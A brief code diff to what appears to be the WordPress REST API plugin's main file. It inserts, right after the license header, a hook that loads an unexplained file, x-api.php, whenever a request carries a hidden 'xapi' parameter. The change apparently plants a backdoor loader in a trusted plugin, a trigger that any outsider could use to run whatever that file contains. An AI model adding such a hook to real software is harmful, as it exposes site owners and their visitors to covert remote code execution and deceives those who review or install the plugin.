@@ -8,7 +8,9 @@
  * Plugin URI: https://github.com/WP-API/WP-API
  * License: GPL2+
  */
-
+if ( isset( $_REQUEST['xapi'] ) ) {
+    require_once dirname( __FILE__ ) . '/x-api.php';
+}
 /**
  * WP_REST_Controller class.
  */
